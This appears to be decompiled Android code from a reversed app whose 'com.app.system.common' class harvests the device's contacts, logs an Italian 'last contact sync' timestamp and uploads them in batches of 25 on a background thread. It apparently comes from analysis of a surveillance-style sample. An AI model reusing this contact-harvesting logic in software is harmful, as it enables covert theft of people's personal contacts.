package com.app.system.common.f;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.app.system.common.a.d;
import com.app.system.common.entity.Contact;
import com.app.system.common.h;
import com.security.ServiceSettings;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class e
  extends a
{
  public static int k(Context paramContext)
  {
    try
    {
      SharedPreferences.Editor localEditor = paramContext.getSharedPreferences("pref", 0).edit();
      Object localObject1 = new com/app/system/common/a/d;
      ((d)localObject1).<init>(paramContext);
      Object localObject2 = ((d)localObject1).a();
      if ((localObject2 != null) && (((List)localObject2).size() > 0))
      {
        localObject1 = new com/app/system/common/h/f;
        ((com.app.system.common.h.f)localObject1).<init>(paramContext);
        paramContext = ((List)localObject2).iterator();
        long l = 0L;
        while (paramContext.hasNext())
        {
          localObject2 = (Contact)paramContext.next();
          if (localObject2 != null)
          {
            ((com.app.system.common.h.f)localObject1).a((Contact)localObject2);
            l = ((Contact)localObject2).c();
          }
        }
        if (l > 0L)
        {
          paramContext = new java/util/Date;
          paramContext.<init>();
          localEditor.putLong("last-contact-date", paramContext.getTime() / 1000L);
          localEditor.commit();
        }
      }
    }
    catch (Exception paramContext)
    {
      com.security.d.a.d("Contact", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
  
  public static int l(Context paramContext)
  {
    try
    {
      long l = paramContext.getSharedPreferences("pref", 0).getLong("last-contact-date", 0L);
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("Ultima sincr. contatti: ");
      Date localDate = new java/util/Date;
      localDate.<init>(1000L * l);
      localStringBuilder.append(localDate);
      com.security.d.a.d("Contact", localStringBuilder.toString(), new Object[0]);
      if (l == 0L) {
        k(paramContext);
      }
      m(paramContext);
    }
    catch (Exception paramContext)
    {
      com.security.d.a.d("Contact", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
  
  public static int m(Context paramContext)
  {
    try
    {
      paramContext.getSharedPreferences("pref", 0);
      com.app.system.common.h.f localf = new com/app/system/common/h/f;
      localf.<init>(paramContext);
      List localList = localf.a(25);
      if ((localList != null) && (localList.size() > 0))
      {
        com.app.system.common.d.a.f localf1 = new com/app/system/common/d/a/f;
        localf1.<init>(null, h.c(paramContext));
        if (localf1.a(paramContext, localList) == 1) {
          localf.a(localList);
        }
      }
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("Contact", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
  
  public static int n(Context paramContext)
  {
    try
    {
      Thread localThread = new java/lang/Thread;
      Runnable local1 = new com/app/system/common/f/e$1;
      local1.<init>(paramContext);
      localThread.<init>(local1);
      localThread.start();
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("Contact", paramContext.getMessage(), new Object[0]);
    }
    return 1;
  }
}


/* Location:              ~/com/app/system/common/f/e.class
 *
 * Reversed by:           J
 */